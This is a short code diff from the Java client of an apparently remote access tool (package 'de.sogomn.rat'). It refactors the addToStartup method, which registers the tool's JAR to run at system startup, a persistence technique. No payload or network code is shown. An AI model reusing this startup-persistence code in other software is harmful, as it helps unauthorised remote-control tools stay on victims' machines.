@@ -1,8 +1,5 @@
 package de.sogomn.rat;
 
-import java.io.File;
-import java.net.URI;
-
 import de.sogomn.rat.gui.ChatWindow;
 import de.sogomn.rat.gui.IGuiController;
 import de.sogomn.rat.packet.ChatPacket;
@@ -95,10 +92,7 @@ public final class Client implements IConnectionObserver, IGuiController {
 	
 	private static void addToStartup() {
 		try {
-			final URI sourceUri = Server.class.getProtectionDomain().getCodeSource().getLocation().toURI();
-			final File source = new File(sourceUri);
-			
-			Resources.OS_SERVICE.addToStartup(source);
+			Resources.OS_SERVICE.addToStartup(Resources.JAR_FILE);
 		} catch (final Exception ex) {
 			ex.printStackTrace();
 		}
